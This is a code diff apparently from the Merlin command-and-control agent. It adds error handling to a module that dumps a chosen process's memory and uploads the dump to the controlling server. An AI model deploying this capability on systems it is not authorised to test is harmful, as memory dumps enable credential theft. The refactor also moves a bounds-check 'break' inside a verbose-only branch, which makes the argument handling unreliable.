@@ -43,11 +43,11 @@ import (
 	"github.com/fatih/color"
 	"github.com/lucas-clemente/quic-go"
 	"github.com/lucas-clemente/quic-go/h2quic"
-	"github.com/satori/go.uuid"
+	uuid "github.com/satori/go.uuid"
 	"golang.org/x/net/http2"
 
 	// Merlin
-	"github.com/Ne0nd0g/merlin/pkg"
+	merlin "github.com/Ne0nd0g/merlin/pkg"
 	"github.com/Ne0nd0g/merlin/pkg/core"
 	"github.com/Ne0nd0g/merlin/pkg/messages"
 )
@@ -647,7 +647,13 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 				message("note", "Received Agent Module Directive")
 			}
 			var p messages.Module
-			json.Unmarshal(payload, &p)
+			e := json.Unmarshal(payload, &p)
+			if e != nil {
+				if a.Verbose {
+					message("warn", fmt.Sprintf("There was an error encoding the CmdPayload JSON "+
+						"message:\r\n%s", e.Error()))
+				}
+			}
 			switch p.Command {
 			case "Minidump":
 				if a.Verbose {
@@ -656,8 +662,10 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 				//ensure the provided args are valid
 				if len(p.Args) < 1 {
 					//not enough args
-					message("warn", fmt.Sprintf("Not enough args were provided to dump a process"))
-					break
+					if a.Verbose {
+						message("warn", fmt.Sprintf("Not enough args were provided to dump a process"))
+						break
+					}
 				}
 				process := p.Args[0] //string TODO: do some validation here I guess
 				//clean the arg - for some reason spaces at the start?
@@ -669,8 +677,10 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 					pidInt, err := strconv.ParseInt(p.Args[1], 0, 32)
 					if err != nil {
 						//probably not well formatted number
-						message("warn", fmt.Sprintf("Could not parse pid value:"+p.Args[1]))
-						message("warn", fmt.Sprintf(err.Error()))
+						if a.Verbose {
+							message("warn", fmt.Sprintf("Could not parse pid value:"+p.Args[1]))
+							message("warn", fmt.Sprintf(err.Error()))
+						}
 						break
 					}
 					pid = uint32(pidInt)
@@ -693,13 +703,24 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 					if a.Verbose {
 						message("note", "Sending error message to sever.")
 					}
-					k, _ := json.Marshal(c)
+					k, err := json.Marshal(c)
+					if err != nil {
+						if a.Verbose {
+							message("warn", fmt.Sprintf("There was an error creating the json"))
+							message("warn", fmt.Sprintf("%s", err.Error()))
+						}
+					}
 					g.Type = "CmdResults"
 					g.Payload = (*json.RawMessage)(&k)
 
 				} else {
 					fileHash := sha1.New()
-					io.WriteString(fileHash, string(fileData))
+					_, errW := io.WriteString(fileHash, string(fileData))
+					if errW != nil {
+						if a.Verbose {
+							message("warn", fmt.Sprintf("There was an error generating the SHA1 file hash e:\r\n%s", errW.Error()))
+						}
+					}
 
 					if a.Verbose {
 						message("note", fmt.Sprintf("Uploading minidump file of size %d bytes and a SHA1 hash of %x to the server",
@@ -713,15 +734,26 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 						IsDownload:   true,
 						Job:          p.Job,
 					}
-
-					k, _ := json.Marshal(c)
+					k, err := json.Marshal(c)
+					if err != nil {
+						if a.Verbose {
+							message("warn", fmt.Sprintf("There was an error creating the json"))
+							message("warn", fmt.Sprintf("%s", err.Error()))
+						}
+					}
 					g.Type = "FileTransfer"
 					g.Payload = (*json.RawMessage)(&k)
-
 				}
 
 				b2 := new(bytes.Buffer)
-				json.NewEncoder(b2).Encode(g)
+				err1 := json.NewEncoder(b2).Encode(g)
+				if err1 != nil {
+					if a.Verbose {
+						message("warn", fmt.Sprintf("There was an error encoding the JSON message:\r\n%s",
+							err1.Error()))
+					}
+					break //don't try and sent POST with broken/empty json
+				}
 				resp2, respErr := client.Post(host, "application/json; charset=utf-8", b2)
 				if respErr != nil {
 					if a.Verbose {
